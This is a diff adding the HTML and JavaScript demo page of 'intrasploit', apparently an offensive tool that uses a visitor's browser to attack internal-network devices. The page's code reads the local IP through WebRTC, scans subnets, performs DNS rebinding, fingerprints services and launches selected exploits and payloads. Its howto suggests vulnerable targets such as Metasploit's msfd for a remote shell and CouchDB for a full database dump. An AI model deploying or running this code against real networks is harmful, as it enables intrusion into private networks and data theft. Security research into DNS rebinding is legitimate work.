@@ -1,0 +1,858 @@
+<html>
+	<head>
+		<title>intrasploit | demo</title>
+		<script src="js/script.js"></script>
+<script>
+
+/**
+* Global data structures
+ * GLOBAL = {
+ *  'randomid': {
+ *   'ip': ip,
+ *   'port': port
+ *  }
+*/
+var GLOBAL = {};
+
+/**
+ * KEY is module name
+ * OPTIONS = {
+ *  'KEY': {
+ *   'value': user decided value,
+ *   'modules': [mod1, mod2],
+ *  }
+ * }
+ */
+var OPTIONS = {};
+
+
+var EXPLOITS = {};
+
+
+// -------------- onlick and onchange functions ------------------- //
+function get_basic_info()	{
+	document.getElementById("browser").innerHTML = Browser()
+	document.getElementById("os").innerHTML = OS()
+}
+
+function addIPSelect(ip)	{
+	var select = document.getElementById("exploit_row_ip");
+	var option = document.createElement("option");
+	option.value = ip;
+	option.innerHTML = ip;
+	select.appendChild(option);
+	send2log("Added IP " + ip + " to list of options");
+}
+
+function network_scan()	{
+	var network = document.getElementById("ips2scan").value;
+	var iplist = IP.cidr2list(network);
+	iplist.shift()
+	iplist.pop()
+	send2log("Starting IP scan of " + String(iplist.length) + " IPs");
+	var scan = Misc.copy_module(PerformIPScan);
+
+	scan.ips2scan = iplist;
+	scan.threads = Number(document.getElementById("ipthreads").value);
+	scan.shuffle();
+	scan.cb_done = cb_ip_scan_done;
+	scan.cb_ip_alive = cb_ip_up;
+	scan.start_ip_scan();
+
+}
+function consent()	{
+	var chk = document.getElementById("consentbox");
+	var mainblk = document.getElementById("mainblock");
+	if(chk.checked == true)	{
+		mainblk.style.display = "block";
+	}
+	else	{
+		mainblk.style.display = "none";
+	}
+}
+
+function getLocalIP()	{
+	WebRTC.callback = function(ip)	{
+		var el = document.getElementById("localipspan");
+		if(ip == undefined)	{
+			send2log("Unable to find local IP");
+			el.innerHTML = "<pre>Unknown</pre>";
+		}
+		else	{
+			send2log("Detected local IP");
+			var range = IP.ip2networkAddr(WebRTC.current_ip, 24);
+			document.getElementById("ips2scan").value = range + "/24";
+			el.innerHTML = "<pre>" + WebRTC.current_ip + "</pre>";
+		}
+	};
+	WebRTC.internal_ip();
+}
+
+function DNSRebind()	{
+	var ip = document.getElementById("exploit_row_ip").value;
+	var port = document.getElementById("exploit_row_port").value;
+	if(ip != "" && port != "")	{
+		perform_dns_rebind(ip, port);
+	}
+	else	{
+		alert("IP and port must be filled out");
+	}
+}
+
+function btn_get_response(cid)	{
+	Network.request("GET", "/client/httpresponse/" + cid, null, function(xhr)	{
+		if(xhr.status == 200)	{
+			var obj = Misc.parse_network2default(xhr, {"httpresponse":""});
+			var str = atob(obj["httpresponse"]);
+
+			// Quick way to get it encoded
+			var str = str.replace(/</g,"&lt;").replace(/>/g,"&gt;");
+			document.getElementById("httpresponseresult").innerHTML = str;
+			send2log("Updated with HTTP response");
+		}
+		else	{
+			document.getElementById("httpresponseresult").innerHTML = "";
+			send2log("Unable to get httpresponse for client");
+		}
+	});
+}
+
+function btn_launch_exploit(cid)	{
+	var eid = getSelected(cid + "_exploit");
+	var pid = getSelected(cid + "_payload");
+	if(eid == null || eid == undefined || pid == null || pid == undefined)	{
+		alert("You must select all values");
+		return;
+	}
+	var ready = getClientValue(cid, 4);
+	if(ready != "Ready")	{
+		alert("DNS rebinding is not complete or was not successful");
+		return;
+	}
+	var options = saveOptions();
+	Network.request_advanced("POST", "/client/exploit/" + cid + "/" + eid + "/" + pid,
+		JSON.stringify(options), function(xhr, method, resource, data, user, pass)	{
+			console.log(xhr);
+		}
+	);
+}
+
+function addAvailablePayloads(eid, sid)	{
+	clearSelect(sid, "Select payload");
+	if(eid == "" || eid == null || eid == undefined)	{
+		return;
+	}
+	else	{
+		for(var i = 0; i < EXPLOITS[eid].length; i++)	{
+			addOptionSelect(sid, EXPLOITS[eid][i]);
+		}
+	}
+}
+
+// Notify server that we should delete all information about ourselves
+function deleteMe()	{
+	var selfid = document.domain.split(".")[0];
+	Network.request("POST", "/client/delete/" + selfid, null, function(xhr)	{
+		if(xhr.status == 200)	{
+			send2log("Sent delete request and recieved " + xhr.responseText);
+			clearJS();
+			// Current page will no longer work, so we redirect to front page
+			window.location = "http://intrasploit.com/";
+		}
+		else	{
+			send2log("Unable to send delete request to server");
+		}
+	});
+}
+
+
+// -------------- Callback functions ------------------------ //
+
+function cb_ip_up(ip)	{
+	send2log("Detected IP: " + ip + " as up");
+	addIPSelect(ip);
+}
+
+function cb_ip_scan_done(up, down)	{
+	send2log("IP scan done, detected " + String(up) + " as up and " + String(down) + " as down");
+}
+
+function cb_get_service(xhr, method, resource, data, user, pass)	{
+	var paths = resource.split("/");
+	var cid = paths[paths.length-1];
+	if(xhr.status == 200)	{
+		var obj = Misc.parse_network2default(xhr, []);
+		send2log("Found service running at: " + GLOBAL[cid]["ip"] + ":" + GLOBAL[cid]["port"]);
+		for(var i = 0; i < obj.length; i++)	{
+			var added = "";
+			if("info" in obj[i])	{
+				added = " (" + obj[i]["info"] + ")";
+			}
+			send2log(GLOBAL[cid]["ip"] + ":" + GLOBAL[cid]["port"] + " matched against " +
+				JSON.stringify(obj[i]));
+			GLOBAL[cid]["product"] = obj[i];
+			updateClient(cid, null, null, null, "Ready");
+
+		}
+		// Get available modules
+		Network.request_advanced("GET", "/client/modules/" + cid, null, cb_available_modules);
+	}
+	else	{
+		GLOBAL[cid]["attempts"] += 1;
+		console.log("Client has not found service yet: " + String(GLOBAL[cid]["attempts"]));
+		if(GLOBAL[cid]["attempts"] > 10)	{
+			send2log("Failed to perform rebinding on " + GLOBAL[cid]["ip"] + ":" + GLOBAL[cid]["port"]);
+			updateClient(cid, null, null, null, "Failed");
+		}
+		else	{
+			window.setTimeout(function()	{
+				Network.request_advanced("GET", "/client/product/" + cid, null, cb_get_service);
+			}, 20000);
+		}
+	}
+}
+
+function cb_available_modules(xhr, method, resource, data, user, pass)	{
+	var paths = resource.split("/");
+	var cid = paths[paths.length-1];
+	if(xhr.status == 200)	{
+		var obj = Misc.parse_network2default(xhr, []);
+		GLOBAL[cid]["modules"] = obj;
+		if(obj.length > 0)	{
+			updateExploits(cid, obj);
+			send2log("Updated available modules");
+		}
+		else	{
+			send2log("No modules found for product");
+		}
+	}
+	else	{
+		send2log("Unable to get modules for " + cid);
+	}
+}
+
+
+
+
+// -------------- Helper functions -------------------------- //
+
+
+// -------------- Functions related to options ------------------- //
+
+function updateOption(opt, modid, optval="")	{
+	if(opt in OPTIONS)	{
+		if(OPTIONS[opt]["modules"].indexOf(modid) <= -1)	{
+			OPTIONS[opt]["modules"].push(modid);
+		}
+		OPTIONS[opt]["value"] = optval;
+	}
+	else	{
+		ins = {"value": optval, "modules": [modid]};
+		OPTIONS[opt] = ins;
+	}
+}
+
+// Get all options a module can configure
+function getOptions(modid)	{
+	var ret = [];
+	for(var key in OPTIONS)	{
+		if(OPTIONS[key]["modules"].indexOf(modid) >= 0)	{
+			ret.push(key);
+		}
+	}
+	return ret;
+}
+
+function getOptionsValues(modid)	{
+	var ret = {};
+	for(var key in OPTIONS)	{
+		if(OPTIONS[key]["modules"].indexOf(modid) >= 0)	{
+			var optval = OPTIONS[key]["value"];
+			if(key.indexOf("LIST") == 0)	{
+				optval = optval.split(",");
+			}
+			ret[key] = optval;
+		}
+	}
+	return ret;
+}
+
+function getOptionsDict(eid, pid)	{
+	saveOptions();
+	var e = getOptionsValues(eid);
+	var p = getOptionsValues(pid);
+	for(var key in e)	{
+		p[key] = e[key];
+	}
+	return p;
+}
+
+function option2value(optkey)	{
+	return OPTIONS[optkey]["value"];
+}
+
+function populateOptions(options, modid)	{
+	var added = false;
+	for(var i = 0; i < options.length; i++)	{
+		updateOption(options[i], modid, "");
+	}
+}
+
+function getOptionsModule(modtype, modid)	{
+	Network.request("GET", "/client/options_" + modtype + "/" + modid, null, function(xhr)	{
+		if(xhr.status == 200)	{
+			obj = Misc.parse_network2default(xhr, [])
+			populateOptions(obj, modid);
+		}
+		else	{
+			send2log("Unable to find options for " + modid);
+		}
+	});
+}
+
+function updateExploits(cid, ids)	{
+	clearSelect(cid + "_exploit", "Select exploit");
+	clearSelect(cid + "_payload", "Select payload");
+
+	for(var i = 0; i < ids.length; i++)	{
+		addOptionSelect(cid + "_exploit", ids[i]);
+	}
+}
+
+function clearSelect(id, text)	{
+	var sel = document.getElementById(id);
+	sel.innerHTML = '<option value="">' + text + '</option>';
+
+}
+
+function addOptionSelect(selectid, v)	{
+	var select = document.getElementById(selectid);
+	var option = document.createElement("option");
+	option.value = v;
+	option.innerHTML = v;
+	select.appendChild(option);
+
+}
+
+// Clear the client table so it has zero rows after header
+function clearClientTable()	{
+	var table = document.getElementById("client_table");
+	table.innerHTML = "<tr><th>ID</th><th>IP</th><th>Port</th><th>Loaded code</th><th>DNS redirected</th><th>Exploit</th><th>Payload</th><th>Launch</th><th>Get response</th></tr>";
+}
+
+function getSelected(id)	{
+	var sel = document.getElementById(id);
+	var ret = sel.options[sel.selectedIndex].value;
+	return ret;
+}
+
+function send2log(msg)	{
+	var date = new Date();
+	var pre = document.createElement("pre");
+	var txt = document.createTextNode(date + " | " + msg)
+	pre.appendChild(txt);
+	var el = document.getElementById("logcontainer");
+	el.appendChild(pre);
+}
+
+function clearJS()	{
+	OPTIONS = {};
+	GLOBAL = {};
+}
+
+// Add a list of default exploits to row with id=id
+function addDefaultExploits(id)	{
+	for(var key in EXPLOITS)	{
+		addOptionSelect(id, key);
+	}
+}
+
+function get_payloads()	{
+	for(var key in EXPLOITS)	{
+		Network.request_advanced("GET", "/client/payloads/" + key, null, function(xhr, method, resource, data, user, pass)	{
+			var key2 = resource.split("/")[3];
+			var items = Misc.parse_network2default(xhr, []);
+			EXPLOITS[key2] = items;
+			for(var i = 0; i < items.length; i++)	{
+				getOptionsModule("payload", items[i]);
+			}
+		});
+	}
+}
+
+function get_exploits()	{
+	Network.request("GET", "/client/possible/modules", null, function(xhr)	{
+		var items = Misc.parse_network2default(xhr, []);
+		for(var i = 0; i < items.length; i++)	{
+			EXPLOITS[items[i]] = [];
+			getOptionsModule("exploit", items[i]);	// Get options for exploits
+		}
+		get_payloads();
+	});
+}
+
+
+// ----------------- clienttable ------------------------ //
+
+function clientListed(id)	{
+	var table = document.getElementById("client_table");
+	var trs = table.getElementsByTagName("tr");
+	for(var i = 1; i < trs.length; i++)	{
+		if(trs[i].id == id)	{
+			return trs[i];
+		}
+	}
+	return undefined;
+}
+
+function addClient(id, ip, port, connected, dns)	{
+	var table = document.getElementById("client_table");
+	var tr = document.createElement("tr");
+	tr.id = id;
+
+	var td1 = document.createElement("td");
+	td1.appendChild(document.createTextNode(id));
+
+	var td2 = document.createElement("td");
+	td2.appendChild(document.createTextNode(ip));
+
+	var td3 = document.createElement("td");
+	td3.appendChild(document.createTextNode(port));
+
+	var td4 = document.createElement("td");
+	td4.appendChild(document.createTextNode(connected));
+
+	var td5 = document.createElement("td");
+	td5.appendChild(document.createTextNode(dns));
+
+	var td6 = document.createElement("td");	// exploits
+	var eselect = document.createElement("select");
+	eselect.id = id + "_exploit";
+	eselect.setAttribute("onchange", "addAvailablePayloads(getSelected('" + id + "_exploit'), '" + id + "_payload');moduleChanged('" + id + "', 'exploit');");
+
+	var eoption = document.createElement("option");
+	eoption.value = "";
+	eoption.innerHTML = "Select exploit";
+	eselect.appendChild(eoption);
+
+	td6.appendChild(eselect);
+
+
+	var td7 = document.createElement("td");	// payloads
+	var pselect = document.createElement("select");
+	pselect.id = id + "_payload";
+	pselect.setAttribute("onchange", "moduleChanged('" + id + "', 'payload');");
+
+	var poption = document.createElement("option");
+	poption.value = "";
+	poption.innerHTML = "Select payload";
+	pselect.appendChild(poption);
+
+	td7.appendChild(pselect);
+
+
+	var td8 = document.createElement("td");	// button
+	var btn = document.createElement("input");
+	btn.id = id + "_button";
+	btn.type = "button";
+	btn.setAttribute("class", "button danger");
+	btn.setAttribute("onclick", "btn_launch_exploit('" + id + "');");
+	btn.value = "Exploit";
+	td8.appendChild(btn);
+
+	var td9 = document.createElement("td");	// get response
+	var btn2 = document.createElement("input");
+	btn2.id = id + "_response";
+	btn2.type = "button";
+	btn2.setAttribute("class", "button safe");
+	btn2.setAttribute("onclick", "btn_get_response('" + id + "');");
+	btn2.value = "Get response";
+	td9.appendChild(btn2);
+
+
+	tr.appendChild(td1);
+	tr.appendChild(td2);
+	tr.appendChild(td3);
+	tr.appendChild(td4);
+	tr.appendChild(td5);
+	tr.appendChild(td6);
+	tr.appendChild(td7);
+	tr.appendChild(td8);
+	tr.appendChild(td9);
+
+	table.appendChild(tr);
+	addDefaultExploits(id + "_exploit");
+}
+
+function getClientValue(cid, row)	{
+	var table = document.getElementById("client_table");
+	var trs = table.getElementsByTagName("tr");
+	for(var i = 1; i < trs.length; i++)	{
+		if(trs[i].id == cid)	{
+		  tds = trs[i].getElementsByTagName("td");
+		  return tds[row].innerHTML;
+		}
+	}
+	return null;
+}
+
+function updateClient(id, ip, port, connected, dns)	{
+	var table = document.getElementById("client_table");
+	var tr = clientListed(id);
+	if(tr == undefined)	{
+		addClient(id, ip, port, connected, dns);
+	}
+	else	{
+		var tds = tr.getElementsByTagName("td");
+		if(ip != null && ip != undefined)	{
+			tds[1].innerHTML = ip;
+		}
+		if(port != null && port != undefined)	{
+			tds[2].innerHTML = port;
+		}
+		if(connected != null && connected != undefined)	{
+			tds[3].innerHTML = connected;
+		}
+		if(dns != null && dns != undefined)	{
+			tds[4].innerHTML = dns;
+		}
+	}
+}
+
+// ----------------- optionstable ------------------------ //
+
+function saveOptions()	{
+	var ret = {}
+	var table = document.getElementById("optionstable");
+	var inputs = table.getElementsByTagName("input");
+	for(var i = 0; i < inputs.length; i++)	{
+		OPTIONS[inputs[i].id]["value"] = inputs[i].value;
+		ret[inputs[i].id] = inputs[i].value;
+	}
+	return ret;
+}
+
+function clearOptions()	{
+	saveOptions();	// save current options
+
+	var table = document.getElementById("optionstable");
+	table.innerHTML = "<tr><th>Name</th><th>Value</th></tr>";
+}
+
+function optionListed(key)	{
+	var table = document.getElementById("optionstable");
+	var inputs = table.getElementsByTagName("input");
+	for(var i = 0; i < inputs.length; i++)	{
+		if(inputs[i].id == key)	return true;
+	}
+	return false;
+}
+
+function addOptionValue(key, val)	{
+	var table = document.getElementById("optionstable");
+
+	var tr = document.createElement("tr");
+	var td1 = document.createElement("td");
+	td1.appendChild(document.createTextNode(key));
+
+	var td2 = document.createElement("td");
+	var input = document.createElement("input");
+	input.type = "text";
+	input.id = key;
+	input.value = val
+	input.placeholder = "Config value";
+	td2.appendChild(input);
+
+	// Append to row
+	tr.appendChild(td1);
+	tr.appendChild(td2);
+
+	// Append to table
+	table.appendChild(tr);
+}
+
+function addOptionsModule(modid)	{
+	for(var key in OPTIONS)	{
+		if(OPTIONS[key]["modules"].indexOf(modid) >= 0)	{
+			addOption(key);
+		}
+	}
+}
+
+function moduleChanged(id, modtype)	{
+	clearOptions();
+	addOptionsModule(getSelected(id + "_exploit"));
+	if(modtype == "payload")	{
+		addOptionsModule(getSelected(id + "_payload"));
+	}
+}
+
+function addOption(key)	{
+	if(optionListed(key))	return;
+	var val = OPTIONS[key]["value"];
+	addOptionValue(key, val);
+}
+
+// ----------------- DNS rebinding ------------------------ //
+
+function dns_done(home, id, ip, port, status)	{
+	if(status == "success")	{
+		GLOBAL[id] = {}
+		GLOBAL[id]["ip"] = ip;
+		GLOBAL[id]["port"] = port;
+		send2log("Successfully loaded code targeting: " + ip + ":" + String(port));
+		updateClient(id, ip, port, "Yes", "In progress");
+		get_service(id, ip, port);
+	}
+	else	{
+		send2log("Failed to perform rebinding on: " + ip + ":" + String(port));
+	}
+}
+
+function perform_dns_rebind(ip, port)	{
+	send2log("Performing DNS rebinding on " + ip + ":" + port + " (takes about a minute)");
+	var rebind = Misc.copy_module(Rebind);
+	rebind.localip = ip;
+	rebind.localport = port;
+	rebind.cb_done_initial = dns_done;
+	rebind.perform();
+}
+
+
+function get_service(cid, ip, port)	{
+	send2log("Trying to detect service at " + ip + ":" + String(port));
+	GLOBAL[cid]["attempts"] = 0;
+	window.setTimeout(
+		function()	{
+			Network.request_advanced("GET", "/client/product/" + cid, null, cb_get_service);
+		},
+		2000
+	);
+}
+
+
+
+
+
+// TODO: Can update this to get values based on ID, if needed
+function getSelectedValues()	{
+	var ip = document.getElementById("exploit_row_ip").value;
+	var port = document.getElementById("exploit_row_port").value;
+	var cid = ip_port2clientid(ip, port);
+	if(cid != undefined)	{
+		var exploit = getSelected("exploit_row_exploit");
+		var payload = getSelected("exploit_row_payload");
+		if(exploit == "" || payload == "")	{
+			return {};
+		}
+
+		return {
+			"ip":ip,
+			"port": port,
+			"id": cid,
+			"exploit": exploit,
+			"payload": payload
+		};
+	}
+	else	{
+		return {};
+	}
+}
+
+function ip_port2clientid(ip, port)	{
+	for(var key in GLOBAL)	{
+		if(GLOBAL[key]["ip"] == ip && GLOBAL[key]["port"] == port)	{
+			return key;
+		}
+	}
+	return undefined;
+}
+
+
+</script>
+<style media="screen" type="text/css">
+div {
+	margin-top: 5px;
+}
+div.box {
+	float:left;
+	margin-right:20px;
+}
+.danger {
+	background-color: red;
+	color: white;
+}
+.safe {
+	background-color: lightblue;
+}
+.button {
+/*	background-color: lightblue; */
+	margin: 4px 2px;
+	padding: 5px 10px;
+	text-align: center;
+	border-style: solid;
+	border-color: black;
+}
+.button:hover:enabled {
+	border-color: lightgrey;
+}
+input.block, label.block {
+	display:block;
+	padding: 5px 10px;
+}
+input {
+	border: 1px solid #ccc;
+	border-radius: 4px;
+}
+hr {
+	display: block;
+	height: 1px;
+	border: 0;
+	border-top: 1px solid #ccc;
+	margin: 1em 0;
+	padding: 0;
+}
+table {
+	text-align: left;
+}
+th, td {
+	padding: 1px 10px;
+}
+.logdiv {
+	width: 100%;
+	padding: 0px 0;
+	text-align: left;
+	vertical-align: top;
+	margin-top: 0px;
+	border: 1px solid black;
+}
+</style>
+	</head>
+	<body onload="get_basic_info(); clearOptions(); addIPSelect('127.0.0.1'); consent(); clearJS(); get_exploits(); clearClientTable();">
+		<div style="float: right">
+			<a href="https://github.com/rstenvi/intrasploit"><img alt="Source code on Github" src="data:image/png;base64, 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"></img></a></div>
+		<h1>intrasploit | demo</h1>
+		<p>This page has been setup to demonstrate intrasploit and how DNS rebinding can be used to attack internal devices.</p>
+		<h2>Disclaimer</h2>
+		<p>Because this tool will generate attack-traffic, you need to acknowledge the disclaimer below (acknowledging the disclaimer does not start any attacks).</p>
+		<div>
+		<input id="consentbox" type="checkbox" onclick="consent();" /> I, the user of this website, understand that this web site will generate attack traffic in the internal network and acknowledge that:
+		<ol>
+			<li>I have permission to perform scans on the network.</li>
+			<li>The owner of the web site takes no responsibility for any potential damages</li>
+		</ol>
+		</div>
+		<hr/>
+		<div id="mainblock" style="display:none;">	<!-- Display after uses has acknowledged disclaimer. -->
+		<div id="foundinformation" style="display:block;">
+			<h2>intrasploit</h2>
+			<div class="box">
+				<label for="browser">Browser</label>
+				<pre id="browser"></pre>
+			</div>
+			<div class="box">
+				<label for="os">OS</label>
+				<pre id="os"></pre>
+			</div>
+			<div class="box">
+				<label for="localip">Local IP</label>
+				<span id="localipspan">
+					<input id="localip" type="button" class="block button safe" value="Get local IP" onclick="getLocalIP();" />
+				</span>
+			</div>
+			<div class="box">
+				<label for="deleteme">Delete all info about me</label>
+				<span id="deletemespan">
+				<input id="deleteme" type="button" class="block button safe" value="Delete me" onclick="deleteMe()" />
+				</span>
+			</div>
+		</div>
+		<br style="clear:both;" />
+		<div id="inputsbasic" style="display:block;">
+			<div class="box">
+				<label for="ips2scan">IP scan subnets</label>
+				<input id="ips2scan" type="text" value="" placeholder="192.168.0.0/24" />
+				<input id="startipscan" type="button" class="button danger" onclick="network_scan();" value="Start IP scan" />
+			</div>
+			<br style="clear:both;" />
+			<div class="box">
+				<label for="manualip">Manually add IP as up</label>
+				<input id="manualip" type="text" placeholder="192.168.0.1" />
+				<input id="addip" type="button" class="button safe" value="Add IP" onclick="addIPSelect(document.getElementById('manualip').value);"/>
+			</div>
+			<br style="clear:both;" />
+			<div class="box">
+				<label for="ipthreads">Threads to use in IP scan</label>
+				<input id="ipthreads" type="text" value="10" />
+			</div>
+		</div>
+		<br style="clear:both;" /><hr/>
+		<div id="exploitation" style="display:block;">
+			<h2>Clients connected</h2>
+			<table id="client_table">
+			</table>
+		</div>
+		<br style="clear:both;" /><hr/>
+		<div id="exploitation" style="display:block;">
+			<h2>DNS rebinding</h2>
+			<table id="exploit_table">
+				<tr>
+					<td><select id="exploit_row_ip"><option value="">Select IP</option></select></td>
+					<td>Port</td>
+					<td><input size="6" placeholder="80" list="defaultports" id="exploit_row_port" /></td>
+					<td><input id="" type="button" class="button danger" value="DNS Rebind" onclick="DNSRebind();" /></td>
+				</tr>
+			</table>
+		</div>
+		<br style="clear:both;" /><hr/>
+		<div id="options">
+			<h2>Options set (parameter names will be filled automatically)</h2>
+			<table id="optionstable">
+			</table>
+		</div>
+		<br style="clear:both;" /><hr/>
+		<div id="log">
+			<h2>Event Log</h2>
+			<div id="logcontainer" class="logdiv"></div>
+		</div>
+		<br style="clear:both;" /><hr />
+		<div id="httresponse">
+			<h2>HTTP response</h2>
+			<pre><code id="httpresponseresult"></code></pre>
+		</div>
+		<br style="clear:both;" /><hr />
+		<div id="howto">
+			<h2>Howto</h2>
+			<p>This page is used to demonstrate intrasploit and show how it works.</p>
+			<p>A limited number of modules are available, so you might wand to set up some vulnerable services beforehand if you want something to test. Some examples are:
+				<ol>
+					<li><code>msfd -a 127.0.0.1 -q -f</code> - Metasploit's daemon can be attacked to get a remote shell (port 55554)</li>
+					<li><code>python3 -m http.server -b 127.0.0.1 8080</code> - A web server that can be attacked (port 8080)</li>
+					<li><code>sudo sudo docker run -p 127.0.0.1:5984:5984 couchdb</code> - CouchDB - can download entire DB (port 5984), you can populate some data with the following commands.
+						<ul>
+							<li><code>curl -X PUT http://127.0.0.1:5984/dbname</code></li>
+							<li><code>curl -X PUT http://127.0.0.1:5984/dbname/testid -d '{"data":123}'</code></li>
+						</ul>
+						The exploit also works if you specify an admin-user, however, you then need to use username/password when adding data.
+						<ul>
+							<li><code>COOKIE=$(curl -X POST http://127.0.0.1:5984/_session  -i -d "name=admin&password=password"|grep "Set-Cookie"|cut -d" " -f2|cut -d";" -f1)</code></li>
+							<li><code>curl -X PUT http://127.0.0.1:5984/dbname --cookie "${COOKIE}"</code></li>
+							<li><code>curl -X PUT http://127.0.0.1:5984/dbname/testid -d '{"data":123}' --cookie "${COOKIE}"</code></li>
+						</ul>
+					</li>
+				</ol>
+			</p>
+			<p>Service detection of non-HTTP services wil not work across browsers (like Metasploit's msfd). It works reasonably well on Firefox, but not on Chrome.</p>
+		</div>
+		</div>
+		<div id="datalists">
+			<datalist id="defaultports">
+				<option value="80">
+				<option value="5984">
+				<option value="8080">
+				<option value="8888">
+				<option value="55554">
+			</datalist>
+		</div>
+	</body>
+</html>
